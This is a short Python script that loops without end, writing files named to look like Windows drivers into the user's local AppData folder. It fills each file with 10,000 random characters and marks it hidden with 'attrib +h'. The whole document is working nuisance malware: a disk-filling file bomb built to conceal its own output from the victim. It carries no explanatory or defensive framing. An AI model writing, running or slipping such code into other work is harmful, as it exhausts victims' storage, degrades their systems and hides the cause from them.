import os, string, random


def fileCreate():
    path = os.getenv('LOCALAPPDATA')

    ran = ''.join(random.choices(string.ascii_uppercase + string.digits, k = 10))
    f = open(path + '/WindowsDriver' + ran + '.win', 'w')
    f.write(''.join(random.choices(string.ascii_uppercase + string.digits, k = 10000)))

    os.system("attrib +h " + path + '/WindowsDriver' + ran + '.win')

while True:
    fileCreate()